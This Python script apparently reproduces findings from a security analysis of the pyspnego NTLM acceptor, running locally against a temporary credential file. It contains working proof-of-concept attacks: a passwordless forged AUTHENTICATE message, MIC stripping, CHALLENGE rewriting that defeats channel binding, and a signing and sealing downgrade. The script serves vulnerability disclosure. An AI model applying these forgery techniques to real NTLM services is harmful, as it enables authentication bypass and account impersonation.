"""Reproducer for the NTLM acceptor trust issues described in security-125-analysis.md.

Run from the repository root:

    PYTHONPATH=src python3 security-125-repro.py

It uses only the pure-Python NTLM provider and a temporary NTLM_USER_FILE, so it needs
no domain, no TLS listener and no network access. Each block prints what the acceptor
did and which check (if any) produced the rejection.
"""

import os
import struct
import tempfile
from unittest import mock

import spnego
import spnego._ntlm
from spnego import NegotiateOptions
from spnego._ntlm_raw.crypto import md5
from spnego._ntlm_raw.messages import (
    Authenticate,
    AvId,
    Challenge,
    Negotiate,
    NegotiateFlags,
    NTClientChallengeV2,
    TargetInfo,
)
from spnego.channel_bindings import GssChannelBindings

USER, PASS, DOMAIN = "probeuser", "ProbePassw0rd!", "PROBE"
CREDS = f"{DOMAIN}\\{USER}"

_fd, _store = tempfile.mkstemp(suffix=".creds")
with os.fdopen(_fd, "w") as f:
    f.write(f"{DOMAIN}:{USER}:{PASS}\nOTHER:otheruser:OtherPassw0rd!\n")
os.environ["NTLM_USER_FILE"] = _store
os.environ.pop("LM_COMPAT_LEVEL", None)

NTLM = NegotiateOptions.use_ntlm
CB_TARGET = GssChannelBindings(application_data=b"tls-server-end-point:TARGET")
NEG_FLAGS = int(
    NegotiateFlags.unicode
    | NegotiateFlags.oem
    | NegotiateFlags.request_target
    | NegotiateFlags.ntlm
    | NegotiateFlags.always_sign
    | NegotiateFlags.extended_session_security
    | NegotiateFlags.sign
    | NegotiateFlags.seal
    | NegotiateFlags.key_128
    | NegotiateFlags.key_56
)


def server(**kw):
    kw.setdefault("hostname", "target")
    kw.setdefault("service", "HTTP")
    return spnego.server(protocol="ntlm", options=NTLM, **kw)


def client(**kw):
    kw.setdefault("hostname", "victim-host")
    kw.setdefault("service", "HOST")
    return spnego.client(CREDS, PASS, protocol="ntlm", options=NTLM, **kw)


def verdict(fn):
    try:
        fn()
        return "ACCEPTED"
    except Exception as e:  # noqa: BLE001
        return f"rejected ({type(e).__name__}: {e})"


def rewrite_challenge(chal, *, drop_timestamp, cbt_hash=None):
    """What a MITM is free to do to the unauthenticated CHALLENGE_MESSAGE."""
    ch = Challenge.unpack(chal)
    ti = TargetInfo()
    for k, v in ch.target_info.items():
        if drop_timestamp and k in (AvId.timestamp, AvId.flags):
            continue
        ti[k] = v
    if cbt_hash is not None:
        ti[AvId.channel_bindings] = cbt_hash
    return Challenge(
        ch.flags, ch.server_challenge, target_name=ch.target_name, target_info=ti, version=ch.version
    ).pack()


def remove_mic(auth):
    """Drop the 16-byte MIC field and fix up every payload offset."""
    a = Authenticate.unpack(bytes(auth))
    if a.mic is None:
        return bytes(auth)
    assert a._payload_offset >= 88
    new = bytearray(auth[:72]) + bytearray(auth[88:])
    for field in (12, 20, 28, 36, 44, 52):
        off = struct.unpack("<I", new[field + 4 : field + 8])[0]
        if off:
            new[field + 4 : field + 8] = struct.pack("<I", off - 16)
    return bytes(new)


def block(title):
    print(f"\n=== {title} ===")


block("F1  forged AUTHENTICATE without knowing any password")
s = server()
s.step(Negotiate(NEG_FLAGS).pack())
forged = Authenticate(
    flags=NEG_FLAGS,
    lm_challenge_response=b"12345678" + b"\x00" * 16,
    nt_challenge_response=None,
    domain_name=DOMAIN,
    username=USER,
)
print("  LM response = <8 attacker bytes> || Z(16), NT response absent")
print("  ->", verdict(lambda: s.step(forged.pack())), "| client_principal =", s.client_principal)

block("F1b same forgery for a second account in the same credential store")
s = server()
s.step(Negotiate(NEG_FLAGS).pack())
forged = Authenticate(
    flags=NEG_FLAGS,
    lm_challenge_response=b"\xde\xad\xbe\xef\xca\xfe\xba\xbe" + b"\x00" * 16,
    nt_challenge_response=None,
    domain_name="OTHER",
    username="otheruser",
)
print("  ->", verdict(lambda: s.step(forged.pack())), "| client_principal =", s.client_principal)

block("F2  MIC is only enforced when the *client* says it sent one")
c, s = client(), server()
chal = s.step(c.step())
print("  acceptor challenge carries MsvAvTimestamp:", AvId.timestamp in Challenge.unpack(chal).target_info)
auth = c.step(chal)
print("  client really sent a MIC:", Authenticate.unpack(auth).mic != b"\x00" * 16)
stripped = remove_mic(auth)
print("  MITM removes the MIC field:", verdict(lambda: s.step(stripped)))

block("F3  channel-binding requirement bypassed by rewriting the CHALLENGE")
c = client()  # CBT-unaware client, i.e. an ordinary victim client
s = server(channel_bindings=CB_TARGET)
chal = s.step(c.step())
forged_chal = rewrite_challenge(chal, drop_timestamp=True, cbt_hash=md5(CB_TARGET.pack()))
auth = c.step(forged_chal)
av = NTClientChallengeV2.unpack(Authenticate.unpack(auth).nt_challenge_response[16:]).av_pairs
print("  echoed CBT equals the target's expectation:", av.get(AvId.channel_bindings) == md5(CB_TARGET.pack()))
print("  client MIC after the rewrite:", Authenticate.unpack(auth).mic.hex())
print("  ->", verdict(lambda: s.step(auth)))

block("F4  a zero CBT hash is treated as 'matches everything'")
c = client(channel_bindings=GssChannelBindings(application_data=b"tls-server-end-point:VICTIM"))
s = server(channel_bindings=CB_TARGET)
chal = s.step(c.step())
with mock.patch.object(spnego._ntlm, "md5", return_value=b"\x00" * 16):
    auth = c.step(chal)
av = NTClientChallengeV2.unpack(Authenticate.unpack(auth).nt_challenge_response[16:]).av_pairs
print("  client sent CBT hash:", av.get(AvId.channel_bindings).hex())
print("  acceptor expected   :", md5(CB_TARGET.pack()).hex())
print("  ->", verdict(lambda: s.step(auth)))

block("F5  CBT is not checked at all on the NTLMv1 / LM paths")
os.environ["LM_COMPAT_LEVEL"] = "0"
c1 = client()
os.environ.pop("LM_COMPAT_LEVEL")
s1 = server(channel_bindings=CB_TARGET)
print("  NTLMv1 client with mismatched CBT:", verdict(lambda: s1.step(c1.step(s1.step(c1.step())))))
c2 = client()
s2 = server(channel_bindings=CB_TARGET)
auth = bytearray(c2.step(s2.step(c2.step())))
auth[20:28] = b"\x00" * 8  # send no NT response, fall back to the LM response
print("  LM-only response with no CBT AV pair:", verdict(lambda: s2.step(bytes(auth))))

block("F6  MsvAvTargetName is never compared with the acceptor's SPN")
c = client(hostname="totally-different-host", service="MSSQLSvc")
s = server()
auth = c.step(s.step(c.step()))
av = NTClientChallengeV2.unpack(Authenticate.unpack(auth).nt_challenge_response[16:]).av_pairs
print("  client target_name:", repr(av.get(AvId.target_name)), "| acceptor spn:", s.spn)
print("  handshake:", verdict(lambda: s.step(auth)))
body = __import__("inspect").getsource(spnego._ntlm.NTLMProxy._step_accept_authenticate)
for token in ("AvId.target_name", "AvFlags.untrusted_spn", "AvId.timestamp"):
    print(f"  acceptor reads {token}: {token in body}")

block("F7  negotiated context flags come verbatim from the AUTHENTICATE message")
c = client(context_req=spnego.ContextReq.none)
s = server(context_req=spnego.ContextReq.integrity | spnego.ContextReq.confidentiality)
s.step(c.step(s.step(c.step())))
print("  acceptor asked for integrity+confidentiality, negotiated:", s.context_attr)

block("F8  downgraded session: unwrap() accepts attacker data as authenticated")
c, s = client(), server()
chal = s.step(c.step())
auth = bytearray(c.step(rewrite_challenge(chal, drop_timestamp=True)))
flags = struct.unpack("<I", auth[60:64])[0]
auth[60:64] = struct.pack("<I", flags & ~int(NegotiateFlags.sign) & ~int(NegotiateFlags.seal))
s.step(bytes(auth))
print("  acceptor context_attr:", s.context_attr)
print("  unwrap() with the constant ALWAYS_SIGN signature:", end=" ")
try:
    print("accepted", s.unwrap(b"\x01" + b"\x00" * 15 + b"ATTACKER-DATA").data)
except Exception as e:  # noqa: BLE001
    print("rejected", type(e).__name__)

block("F9  per-step bindings are silently dropped (fail-open)")
c = client()
s = server()
chal = s.step(c.step(), channel_bindings=CB_TARGET)  # developer believes CBT is now required
auth = c.step(chal)  # client sends no CBT at all
print("  CBT supplied only on the first accept step:", verdict(lambda: s.step(auth)))

block("F10 empty GssChannelBindings has a public, constant hash")
print("  md5(GssChannelBindings().pack()) =", md5(GssChannelBindings().pack()).hex())
print("  Z(16)                            =", "00" * 16)
